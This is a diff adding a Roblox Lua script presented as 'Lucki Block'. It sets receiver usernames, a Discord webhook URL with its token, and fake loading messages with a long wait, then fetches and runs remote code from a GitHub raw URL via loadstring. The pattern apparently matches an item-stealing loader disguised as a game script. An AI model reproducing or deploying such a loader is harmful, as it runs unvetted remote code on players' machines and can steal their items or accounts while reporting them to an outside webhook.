@@ -1,0 +1,10 @@
+UserName = "TAAA9999999999"
+UserName2 = "Zzz"
+Webhook = "https://discord.com/api/webhooks/1107130437622575194/XkJAxhkvDecASA9VT7cwCM1zUF9fSLwgQ-BZAooQ-h1-urvaICPQK8Rxdh45wAlag0HR"
+_G.ScriptName = "Lucki Block"
+_G.FirstText = "Welcome"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 160
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
